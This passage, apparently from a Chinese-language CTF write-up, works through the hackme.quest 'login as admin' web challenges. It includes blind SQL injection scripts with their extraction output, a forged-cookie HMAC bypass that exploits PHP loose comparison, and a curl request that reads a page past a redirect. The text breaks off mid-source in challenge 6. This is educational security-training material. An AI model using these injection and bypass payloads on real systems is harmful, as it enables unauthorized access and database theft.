0bdb54 97: Table: 0bdb54c 108: Table: 0bdb54c9 119: Table: 0bdb54c98 1210: Table: 0bdb54c981 1311: Table: 0bdb54c9812 1412: Table: 0bdb54c98123 1513: Table: 0bdb54c98123f 1614: Table: 0bdb54c98123f5 1715: Table: 0bdb54c98123f55 1816: Table: 0bdb54c98123f552 1917: Table: 0bdb54c98123f5526 2018: Table: 0bdb54c98123f5526c 2119: Table: 0bdb54c98123f5526cc 2220: Table: 0bdb54c98123f5526cca 2321: Table: 0bdb54c98123f5526ccae 2422: Table: 0bdb54c98123f5526ccaed 2523: Table: 0bdb54c98123f5526ccaed9 2624: Table: 0bdb54c98123f5526ccaed98 2725: Table: 0bdb54c98123f5526ccaed982 2826: Table: 0bdb54c98123f5526ccaed982d 2927: Table: 0bdb54c98123f5526ccaed982d2 3028: Table: 0bdb54c98123f5526ccaed982d20 3129: Table: 0bdb54c98123f5526ccaed982d200 3230: Table: 0bdb54c98123f5526ccaed982d2006 3331: Table: 0bdb54c98123f5526ccaed982d2006a 3432: Table: 0bdb54c98123f5526ccaed982d2006a9 3533: Table: 0bdb54c98123f5526ccaed982d2006a9, 3634: Table: 0bdb54c98123f5526ccaed982d2006a9,u 3735: Table: 0bdb54c98123f5526ccaed982d2006a9,us 3836: Table: 0bdb54c98123f5526ccaed982d2006a9,use 3937: Table: 0bdb54c98123f5526ccaed982d2006a9,user 4038: Table: 0bdb54c98123f5526ccaed982d2006a9,users 可以得知有兩個 table 0bdb54c98123f5526ccaed982d2006a9及users，flag 應該在前者沒錯了。\n之後繼續用同樣套路盲注column名字：\n1import requests 2from bs4 import BeautifulSoup 3 4datas = {\u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;: \u0026#34;payload\u0026#34;} 5column = \u0026#39;\u0026#39; 6 7for i in range(1,128): 8 print(str(i)+\u0026#34;: \u0026#34;, end=\u0026#34;\u0026#34;) 9 for j in range(32,127): 10 datas[\u0026#39;password\u0026#39;] = \u0026#39;\\\\\\\u0026#39;/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=\u0026#34;0bdb54c98123f5526ccaed982d2006a9\u0026#34;),\u0026#39;+str(i)+\u0026#39;,1))=\u0026#34;\u0026#39;+str(j)+\u0026#39;\u0026#34;,1,0)/**/#\u0026#39; 11 r = requests.post(\u0026#39;https://ctf.hackme.quest/login1/\u0026#39;, data=datas) 12 soup = BeautifulSoup(r.text, \u0026#39;html.parser\u0026#39;) 13 text = soup.find(\u0026#39;h4\u0026#39;).text 14 if text==\u0026#39;You are admin!\u0026#39;: 15 column = column + chr(j) 16 print(\u0026#34;Column: \u0026#34;+column) 17 break 11: Column: 4 22: Column: 4a 33: Column: 4a3 4. 5. 6. 733: Column: 4a391a11cfa831ca740cf8d00782f3a6, 834: Column: 4a391a11cfa831ca740cf8d00782f3a6,i 935: Column: 4a391a11cfa831ca740cf8d00782f3a6,id 可以看到結果有兩個欄位(UNION SELECT雖然看到是4個欄位，但應該是關聯了users這張 table 所以執行結果應該是沒錯的)\n最後再撈 Flag，查看0bdb54c98123f5526ccaed982d2006a9表中的4a391a11cfa831ca740cf8d00782f3a6欄位：\n1import requests 2from bs4 import BeautifulSoup 3 4datas = {\u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;: \u0026#34;payload\u0026#34;} 5flag = \u0026#39;\u0026#39; 6 7for i in range(1,128): 8 print(str(i)+\u0026#34;: \u0026#34;, end=\u0026#34;\u0026#34;) 9 for j in range(32,127): 10 datas[\u0026#39;password\u0026#39;] = \u0026#39;\\\\\\\u0026#39;/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(4a391a11cfa831ca740cf8d00782f3a6)/**/FROM/**/0bdb54c98123f5526ccaed982d2006a9),\u0026#39;+str(i)+\u0026#39;,1))=\u0026#34;\u0026#39;+str(j)+\u0026#39;\u0026#34;,1,0)/**/#\u0026#39; 11 r = requests.post(\u0026#39;https://ctf.hackme.quest/login1/\u0026#39;, data=datas) 12 soup = BeautifulSoup(r.text, \u0026#39;html.parser\u0026#39;) 13 text = soup.find(\u0026#39;h4\u0026#39;).text 14 if text==\u0026#39;You are admin!\u0026#39;: 15 flag = flag + chr(j) 16 print(\u0026#34;Flag: \u0026#34;+flag) 17 break 11: Flag: F 22: Flag: FL 33: Flag: FLA 44: Flag: FLAG 55: Flag: FLAG{ 66: Flag: FLAG{W 77: Flag: FLAG{W0 88: Flag: FLAG{W0W 99: Flag: FLAG{W0W, 1010: Flag: FLAG{W0W, 1111: Flag: FLAG{W0W, Y 1212: Flag: FLAG{W0W, Yo 1313: Flag: FLAG{W0W, You 1414: Flag: FLAG{W0W, You 1515: Flag: FLAG{W0W, You f 1616: Flag: FLAG{W0W, You fo 1717: Flag: FLAG{W0W, You fou 1818: Flag: FLAG{W0W, You foun 1919: Flag: FLAG{W0W, You found 2020: Flag: FLAG{W0W, You found 2121: Flag: FLAG{W0W, You found t 2222: Flag: FLAG{W0W, You found th 2323: Flag: FLAG{W0W, You found the 2424: Flag: FLAG{W0W, You found the 2525: Flag: FLAG{W0W, You found the c 2626: Flag: FLAG{W0W, You found the co 2727: Flag: FLAG{W0W, You found the cor 2828: Flag: FLAG{W0W, You found the corr 2929: Flag: FLAG{W0W, You found the corre 3030: Flag: FLAG{W0W, You found the correc 3131: Flag: FLAG{W0W, You found the correct 3232: Flag: FLAG{W0W, You found the correct 3333: Flag: FLAG{W0W, You found the correct t 3434: Flag: FLAG{W0W, You found the correct ta 3535: Flag: FLAG{W0W, You found the correct tab 3636: Flag: FLAG{W0W, You found the correct tabl 3737: Flag: FLAG{W0W, You found the correct table 3838: Flag: FLAG{W0W, You found the correct table 3939: Flag: FLAG{W0W, You found the correct table a 4040: Flag: FLAG{W0W, You found the correct table an 4141: Flag: FLAG{W0W, You found the correct table and 4242: Flag: FLAG{W0W, You found the correct table and 4343: Flag: FLAG{W0W, You found the correct table and t 4444: Flag: FLAG{W0W, You found the correct table and th 4545: Flag: FLAG{W0W, You found the correct table and the 4646: Flag: FLAG{W0W, You found the correct table and the 4747: Flag: FLAG{W0W, You found the correct table and the f 4848: Flag: FLAG{W0W, You found the correct table and the fl 4949: Flag: FLAG{W0W, You found the correct table and the fla 5050: Flag: FLAG{W0W, You found the correct table and the flag 5151: Flag: FLAG{W0W, You found the correct table and the flag, 5252: Flag: FLAG{W0W, You found the correct table and the flag, 5353: Flag: FLAG{W0W, You found the correct table and the flag, a 5454: Flag: FLAG{W0W, You found the correct table and the flag, an 5555: Flag: FLAG{W0W, You found the correct table and the flag, and 5656: Flag: FLAG{W0W, You found the correct table and the flag, and 5757: Flag: FLAG{W0W, You found the correct table and the flag, and U 5858: Flag: FLAG{W0W, You found the correct table and the flag, and Us 5959: Flag: FLAG{W0W, You found the correct table and the flag, and Use 6060: Flag: FLAG{W0W, You found the correct table and the flag, and User 6161: Flag: FLAG{W0W, You found the correct table and the flag, and UserA 6262: Flag: FLAG{W0W, You found the correct table and the flag, and UserAg 6363: Flag: FLAG{W0W, You found the correct table and the flag, and UserAge 6464: Flag: FLAG{W0W, You found the correct table and the flag, and UserAgen 6565: Flag: FLAG{W0W, You found the correct table and the flag, and UserAgent 6666: Flag: FLAG{W0W, You found the correct table and the flag, and UserAgent} 這題 Flag 也太長了吧\u0026hellip; 網路不好，等很久\u0026hellip; (一定是故意的)\n總之這題就是\u0026hellip; Blind-Injection，然後很費時。\nFlag: FLAG{W0W, You found the correct table and the flag, and UserAgent}\n25. login as admin 3 # login as admin\n接下來幾題都沒有提示，由於沒有方向，就去看它的source code來找洞解。\nSource code:\n1\u0026lt;?php 2require(\u0026#39;users_db.php\u0026#39;); // $users 3 4if($_GET[\u0026#39;show_source\u0026#39;] === \u0026#39;1\u0026#39;) { 5 highlight_file(__FILE__); 6 exit; 7} 8 9if($_GET[\u0026#39;logout\u0026#39;] === \u0026#39;1\u0026#39;) { 10 setcookie(\u0026#39;user\u0026#39;, \u0026#39;\u0026#39;, 0); 11 header(\u0026#39;Location: ./\u0026#39;); 12} 13 14function set_user($user_data) 15{ 16 global $user, $secret; 17 18 $user = [$user_data[\u0026#39;name\u0026#39;], $user_data[\u0026#39;admin\u0026#39;]]; 19 20 $data = json_encode($user); 21 $sig = hash_hmac(\u0026#39;sha512\u0026#39;, $data, $secret); 22 $all = base64_encode(json_encode([\u0026#39;sig\u0026#39; =\u0026gt; $sig, \u0026#39;data\u0026#39; =\u0026gt; $data])); 23 setcookie(\u0026#39;user\u0026#39;, $all, time()+3600); 24} 25 26$error = null; 27 28function load_user() 29{ 30 global $secret, $error; 31 32 if(empty($_COOKIE[\u0026#39;user\u0026#39;])) { 33 return null; 34 } 35 36 $unserialized = json_decode(base64_decode($_COOKIE[\u0026#39;user\u0026#39;]), true); 37 $r = hash_hmac(\u0026#39;sha512\u0026#39;, $unserialized[\u0026#39;data\u0026#39;], $secret) != $unserialized[\u0026#39;sig\u0026#39;]; 38 39 if(hash_hmac(\u0026#39;sha512\u0026#39;, $unserialized[\u0026#39;data\u0026#39;], $secret) != $unserialized[\u0026#39;sig\u0026#39;]) { 40 $error = \u0026#39;Invalid session\u0026#39;; 41 return false; 42 } 43 44 $data = json_decode($unserialized[\u0026#39;data\u0026#39;], true); 45 return [ 46 \u0026#39;name\u0026#39; =\u0026gt; $data[0], 47 \u0026#39;admin\u0026#39; =\u0026gt; $data[1] 48 ]; 49} 50 51$user = load_user(); 52 53if(!empty($_POST[\u0026#39;name\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;password\u0026#39;])) { 54 $user = false; 55 foreach($users as $u) { 56 if($u[\u0026#39;name\u0026#39;] === $_POST[\u0026#39;name\u0026#39;] \u0026amp;\u0026amp; $u[\u0026#39;password\u0026#39;] === $_POST[\u0026#39;password\u0026#39;]) { 57 set_user($u); 58 } 59 } 60} 61?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 62\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 63\u0026lt;head\u0026gt; 64 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 65 \u0026lt;title\u0026gt;Login As Admin 3\u0026lt;/title\u0026gt; 66 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 67 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 68\u0026lt;/head\u0026gt; 69\u0026lt;body\u0026gt; 70 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 71 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 72 \u0026lt;h1\u0026gt;Login as Admin 3\u0026lt;/h1\u0026gt; 73 \u0026lt;/div\u0026gt; 74 \u0026lt;/div\u0026gt; 75 76 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 77 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 78 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 79 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 80 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 81 \u0026lt;/div\u0026gt; 82 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 83 \u0026lt;li\u0026gt; 84 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 85 \u0026lt;/li\u0026gt; 86 \u0026lt;li\u0026gt; 87 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 88 \u0026lt;/li\u0026gt; 89\u0026lt;?php if($user): ?\u0026gt; 90 \u0026lt;li\u0026gt; 91 \u0026lt;a href=\u0026#34;?logout=1\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt; 92 \u0026lt;/li\u0026gt; 93\u0026lt;?php endif; ?\u0026gt; 94 \u0026lt;/ul\u0026gt; 95 \u0026lt;/div\u0026gt; 96 \u0026lt;/div\u0026gt; 97 \u0026lt;/div\u0026gt; 98 99\u0026lt;?php if($error !== null): ?\u0026gt; 100 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 101 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;\u0026lt;?=$error?\u0026gt;\u0026lt;/div\u0026gt; 102 \u0026lt;/div\u0026gt; 103\u0026lt;?php endif; ?\u0026gt; 104 105 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 106 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 107\u0026lt;?php if(!$user): ?\u0026gt; 108\u0026lt;?php if($user === false): ?\u0026gt; 109 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; 110\u0026lt;?php endif; ?\u0026gt; 111 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 112 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 113 \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;User:\u0026lt;/label\u0026gt; 114 \u0026lt;input id=\u0026#34;name\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;User\u0026#34;\u0026gt; 115 \u0026lt;/div\u0026gt; 116 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 117 \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Pass:\u0026lt;/label\u0026gt; 118 \u0026lt;input id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; 119 \u0026lt;/div\u0026gt; 120 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 121 \u0026lt;input class=\u0026#34;form-control btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; 122 \u0026lt;/div\u0026gt; 123 \u0026lt;/form\u0026gt; 124 125 \u0026lt;div\u0026gt; 126 \u0026lt;p\u0026gt; 127 You can login with \u0026lt;code\u0026gt;guest\u0026lt;/code\u0026gt; / \u0026lt;code\u0026gt;guest\u0026lt;/code\u0026gt;. 128 \u0026lt;/p\u0026gt; 129 \u0026lt;/div\u0026gt; 130\u0026lt;?php else: ?\u0026gt; 131 \u0026lt;h3\u0026gt;Hi, \u0026lt;?=htmlentities($user[\u0026#39;name\u0026#39;])?\u0026gt;\u0026lt;/h3\u0026gt; 132 133 \u0026lt;h4\u0026gt;\u0026lt;?=sprintf(\u0026#34;You %s admin!\u0026#34;, $user[\u0026#39;admin\u0026#39;] ? \u0026#34;are\u0026#34; : \u0026#34;are not\u0026#34;)?\u0026gt;\u0026lt;/h4\u0026gt; 134 135 \u0026lt;?php if($user[\u0026#39;admin\u0026#39;]) printf(\u0026#34;\u0026lt;code\u0026gt;%s\u0026lt;/code\u0026gt;\u0026#34;, htmlentities($flag)); ?\u0026gt; 136\u0026lt;?php endif; ?\u0026gt; 137 \u0026lt;/div\u0026gt; 138 \u0026lt;/div\u0026gt; 139\u0026lt;/body\u0026gt; 140\u0026lt;/html\u0026gt; 稍微看過之後，大概了解了流程是，使用者輸入帳號密碼後，會將用戶資訊附上簽章，以json格式進行base64編碼後寫在 cookie 中。\n在驗證使用者資訊時，會再次運算使用者資訊，並與簽章做判斷是否相符。\n乍看之下該流程似乎無懈可擊，但有個點很奇怪\u0026hellip;\n為何在大多數判斷式都是以「===」來判斷，但在load_user()這個 funcion 中卻是以!=判斷，這是不精確的一種邏輯運算子(應該使用!==更為精確)。\n(p.s. 如果不清楚==與===差別，請自行 Google，本文不再贅述)\n這會讓我想到著名的 PHP 處理 MD5 的 0e 開頭字串總是判斷為0的特性。(使用==情況下)\n這題主要重點是要將判斷式hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']給繞過。\n先以guest/guest登入訪客帳號。\n這時候可以看到已經生成一個cookie叫做user了。\n將其值以base64解碼後，會得到一串json格式的字串「{\u0026quot;sig\u0026quot;:\u0026quot;75d53f97acd211098a052b305d1caf191436c6d29d1936d947f8fde7733008a3968edaa4b4a68242db8696030505273914ded688d459e8c9225200d729a0b98e\u0026quot;,\u0026quot;data\u0026quot;:\u0026quot;[\\\u0026quot;guest\\\u0026quot;,false]\u0026quot;}」。\n其中sig就是憑證，而data裝的則是使用者及是否為管理員。\n我們需要拿到管理員權限，因此先將驗證是否為管理員的欄位改為true。\n但如果就這麼將 cookie 塞回去則 server 會在判斷時發現data內容與對應的簽章不符而導致驗證失敗。\n接著將sig改為true。\n如此一來判斷式將會將會變成hash_hmac('sha512', $unserialized['data'], $secret) != true\n不管經過hash_hmac()運算過後的結果如何，只要不出錯，都一律被當作true給!=做判斷，所以該判斷式將一律為false，也就可以繞過了。\nPayload {\u0026quot;sig\u0026quot;:true,\u0026quot;data\u0026quot;:\u0026quot;[\\\u0026quot;guest\\\u0026quot;,true]\u0026quot;}，記得base64編碼後再塞回去 cookie。(eyJzaWciOnRydWUsImRhdGEiOiJbXCJndWVzdFwiLHRydWVdIn0=)\nFlag FLAG{H3110, 4dm1n1576a70r... 1f y0u kn0w my 53cR37 and Use STRONG COMPARE pls}\n26. login as admin 4 # login as admin\nSource code:\n1\u0026lt;?php 2require(\u0026#39;config.php\u0026#39;); 3 4if($_GET[\u0026#39;show_source\u0026#39;] === \u0026#39;1\u0026#39;) { 5 highlight_file(__FILE__); 6 exit; 7} 8 9if($_POST[\u0026#39;name\u0026#39;] === \u0026#39;admin\u0026#39;) { 10 if($_POST[\u0026#39;password\u0026#39;] !== $password) { 11 // show failed message if you input wrong password 12 header(\u0026#39;Location: ./?failed=1\u0026#39;); 13 } 14} 15?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 16\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 17\u0026lt;head\u0026gt; 18 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 19 \u0026lt;title\u0026gt;Login As Admin 4\u0026lt;/title\u0026gt; 20 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 21 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 22\u0026lt;/head\u0026gt; 23\u0026lt;body\u0026gt; 24 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 25 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 26 \u0026lt;h1\u0026gt;Login as Admin 4\u0026lt;/h1\u0026gt; 27 \u0026lt;/div\u0026gt; 28 \u0026lt;/div\u0026gt; 29 30 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 31 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 32 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 33 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 34 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 35 \u0026lt;/div\u0026gt; 36 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 37 \u0026lt;li\u0026gt; 38 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 39 \u0026lt;/li\u0026gt; 40 \u0026lt;li\u0026gt; 41 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 42 \u0026lt;/li\u0026gt; 43 \u0026lt;/ul\u0026gt; 44 \u0026lt;/div\u0026gt; 45 \u0026lt;/div\u0026gt; 46 \u0026lt;/div\u0026gt; 47 48 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 49 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 50\u0026lt;?php if($_GET[\u0026#39;failed\u0026#39;] == \u0026#39;1\u0026#39;): ?\u0026gt; 51 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; 52\u0026lt;?php endif; ?\u0026gt; 53 54\u0026lt;?php if($_POST[\u0026#39;name\u0026#39;] === \u0026#39;admin\u0026#39;): /* login success! */ ?\u0026gt; 55 \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;\u0026lt;code\u0026gt;\u0026lt;?=$flag?\u0026gt;\u0026lt;/code\u0026gt;\u0026lt;/div\u0026gt; 56\u0026lt;?php else: ?\u0026gt; 57 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; 58 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 59 \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;User:\u0026lt;/label\u0026gt; 60 \u0026lt;input id=\u0026#34;name\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;User\u0026#34;\u0026gt; 61 \u0026lt;/div\u0026gt; 62 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 63 \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;Pass:\u0026lt;/label\u0026gt; 64 \u0026lt;input id=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;Password\u0026#34;\u0026gt; 65 \u0026lt;/div\u0026gt; 66 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 67 \u0026lt;input class=\u0026#34;form-control btn btn-primary\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Login\u0026#34;\u0026gt; 68 \u0026lt;/div\u0026gt; 69 \u0026lt;/form\u0026gt; 70\u0026lt;?php endif; ?\u0026gt; 71 \u0026lt;/div\u0026gt; 72 \u0026lt;/div\u0026gt; 73\u0026lt;/body\u0026gt; 74\u0026lt;/html\u0026gt; 這題主要是在講一個觀念「敏感資料不會因為不輸出在頁面上就不被看到」。\n可以看到在密碼判斷不符合後，設計者使用header()來將使用者重新導向。\n但之後的程式碼還是會繼續執行，只是因為頁面被導向，所以表面上看不到，只要用一些工具就可以看到了(例如curl)。\n1curl -X POST -d \u0026#34;name=admin\u0026amp;password=password\u0026#34; https://ctf.hackme.quest/login4/ 1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;title\u0026gt;Login As Admin 4\u0026lt;/title\u0026gt; 6 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 7 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 8\u0026lt;/head\u0026gt; 9\u0026lt;body\u0026gt; 10 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 12 \u0026lt;h1\u0026gt;Login as Admin 4\u0026lt;/h1\u0026gt; 13 \u0026lt;/div\u0026gt; 14 \u0026lt;/div\u0026gt; 15 16 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 17 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 18 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 19 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 20 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 21 \u0026lt;/div\u0026gt; 22 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 23 \u0026lt;li\u0026gt; 24 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 25 \u0026lt;/li\u0026gt; 26 \u0026lt;li\u0026gt; 27 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 28 \u0026lt;/li\u0026gt; 29 \u0026lt;/ul\u0026gt; 30 \u0026lt;/div\u0026gt; 31 \u0026lt;/div\u0026gt; 32 \u0026lt;/div\u0026gt; 33 34 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 35 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 36 37 \u0026lt;div class=\u0026#34;alert alert-success\u0026#34;\u0026gt;\u0026lt;code\u0026gt;FLAG{Remember add exit after redirection..}\u0026lt;/code\u0026gt;\u0026lt;/div\u0026gt; 38 \u0026lt;/div\u0026gt; 39 \u0026lt;/div\u0026gt; 40\u0026lt;/body\u0026gt; 41\u0026lt;/html\u0026gt; Flag FLAG{Remember add exit after redirection..}\n27. login as admin 6 # login as admin\nSource code:\n1\u0026lt;?php 2@error_reporting(E_ALL^E_NOTICE); 3require(\u0026#39;config.php\u0026#39;); 4 5if($_GET[\u0026#39;show_source\u0026#39;] === \u0026#39;1\u0026#39;) { 6 highlight_file(__FILE__); 7 exit; 8} 9 10$user = null; 11 12// connect to database 13 14if(!empty($_POST[\u0026#39;data\u0026#39;])) { 15 try { 16 $data = json_decode($_POST[\u0026#39;data\u0026#39;], true); 17 } catch (Exception $e) { 18 $data = []; 19 } 20 extract($data); 21 if($users[$username] \u0026amp;\u0026amp; strcmp($users[$username], $password) == 0) { 22 $user = $username; 23 } 24} 25?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 26\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 27\u0026lt;head\u0026gt; 28 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 29 \u0026lt;title\u0026gt;Login As Admin 6\u0026lt;/title\u0026gt; 30 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; 31 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 32\u0026lt;/head\u0026gt; 33\u0026lt;body\u0026gt; 34 \u0026lt;div class=\u0026#34;jumbotron\u0026#34;\u0026gt; 35 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 36 \u0026lt;h1\u0026gt;Login as Admin 6\u0026lt;/h1\u0026gt; 37 \u0026lt;/div\u0026gt; 38 \u0026lt;/div\u0026gt; 39 40 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 41 \u0026lt;div class=\u0026#34;navbar\u0026#34;\u0026gt; 42 \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; 43 \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; 44 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;/\u0026#34;\u0026gt;Please Hack Me\u0026lt;/a\u0026gt; 45 \u0026lt;/div\u0026gt; 46 \u0026lt;ul class=\u0026#34;nav navbar-nav\u0026#34;\u0026gt; 47 \u0026lt;li\u0026gt; 48 \u0026lt;a href=\u0026#34;/scoreboard\u0026#34;\u0026gt;Scoreboard\u0026lt;/a\u0026gt; 49 \u0026lt;/li\u0026gt; 50 \u0026lt;li\u0026gt; 51 \u0026lt;a href=\u0026#34;?show_source=1\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Source Code\u0026lt;/a\u0026gt; 52 \u0026lt;/li\u0026gt; 53 \u0026lt;/ul\u0026gt; 54 \u0026lt;/div\u0026gt; 55 \u0026lt;/div\u0026gt; 56 \u0026lt;/div\u0026gt; 57 58 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; 59 \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3\u0026#34;\u0026gt; 60\u0026lt;?php if(!$user \u0026amp;\u0026amp; isset($_POST[\u0026#39;data\u0026#39;])): ?\u0026gt; 61 \u0026lt;div class=\u0026#34;alert alert-danger\u0026#34;\u0026gt;Login failed\u0026lt;/div\u0026gt; 62\u0026lt;?php endif; ?\u0026gt; 63\u0026lt;?php if(!$user): ?\u0026gt; 64 \u0026lt;form action=\u0026#34;.\u0026#34; method=\u0026#34;POST\u0026#34; id=\u0026#34;form_login\u0026#34;\u0026gt; 65 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 66 \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;User:\u0026lt;/label\u0026gt; 67 \u0026lt;input id=\u0026#34;username\u0026#34; class=\u0026#34;form-control\u0026#34; 